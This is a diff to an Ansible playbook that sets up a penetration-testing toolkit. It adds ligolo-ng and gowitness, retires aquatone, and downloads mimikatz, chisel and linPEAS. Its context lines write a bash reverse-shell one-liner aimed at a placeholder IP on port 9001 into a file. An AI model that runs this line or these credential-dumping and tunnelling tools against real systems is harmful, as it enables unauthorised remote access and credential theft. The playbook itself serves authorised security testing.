@@ -17,6 +17,7 @@
     - "chisel"
     - "mimikatz-binaries"
     - "aquatone"
+    - "ligolo-ng"
 
 - name: Download linPEAS.sh script
   ansible.builtin.get_url:
@@ -104,8 +105,9 @@
   loop:
     - "https://github.com/gentilkiwi/mimikatz/releases/download/{{
       mimikatz_version }}/mimikatz_trunk.zip"
-    - "https://github.com/michenriksen/aquatone/releases/download/v{{
-      aquatone_version }}/aquatone_linux_amd64_{{ aquatone_version }}.zip"
+    # aquatone is archived (last release 2019); gowitness is the modern replacement
+    # - "https://github.com/michenriksen/aquatone/releases/download/v{{
+    #   aquatone_version }}/aquatone_linux_amd64_{{ aquatone_version }}.zip"
 
 - name: Extract Archives
   ansible.builtin.unarchive:
@@ -115,8 +117,8 @@
   loop:
     - src: "/tmp/mimikatz_trunk.zip"
       dest: "{{ tools_dir }}/mimikatz-binaries/"
-    - src: "/tmp/aquatone_linux_amd64_{{ aquatone_version }}.zip"
-      dest: "{{ tools_dir }}/aquatone"
+    # - src: "/tmp/aquatone_linux_amd64_{{ aquatone_version }}.zip"
+    #   dest: "{{ tools_dir }}/aquatone"
 
 - name: Check if chisel binary exists
   ansible.builtin.stat:
@@ -125,7 +127,7 @@
   with_items: "{{ chisel_platforms }}"
 
 - name: Debug chisel status
-  tags: debug
+  tags: debug, never
   ansible.builtin.debug:
     var: chisel_binary_status
 
@@ -147,6 +149,30 @@
   when: not chisel_binary_status.results[item.0].stat.exists
   with_indexed_items: "{{ chisel_platforms }}"
   # noqa: command-instead-of-shell
+
+- name: Download gowitness binary
+  ansible.builtin.get_url:
+    url: "https://github.com/sensepost/gowitness/releases/download/{{
+      gowitness_version }}/gowitness-{{ gowitness_version }}-linux-amd64"
+    dest: "{{ tools_dir }}/gowitness"
+    mode: "0755"
+    force: false
+
+- name: Download ligolo-ng archives
+  ansible.builtin.get_url:
+    url: "{{ item.url }}"
+    dest: "/tmp/{{ item.url | basename }}"
+    mode: "0644"
+    force: false
+  loop: "{{ ligolo_ng_files }}"
+
+- name: Extract ligolo-ng archives
+  ansible.builtin.unarchive:
+    remote_src: true
+    src: "/tmp/{{ item.url | basename }}"
+    dest: "{{ tools_dir }}/ligolo-ng/"
+    creates: "{{ tools_dir }}/ligolo-ng/{{ item.creates }}"
+  loop: "{{ ligolo_ng_files }}"
 
 - name: Create Burpsuite directory
   ansible.builtin.file:
@@ -178,4 +204,10 @@
       bash -c 'exec bash -i &>/dev/tcp/IP/9001 <&1'
     backup: false
     create: true
+    mode: "0755"
+
+- name: Copy tools cheatsheet script
+  ansible.builtin.copy:
+    src: tools_cheatsheet.sh
+    dest: "{{ tools_dir }}/tools_cheatsheet.sh"
     mode: "0755"
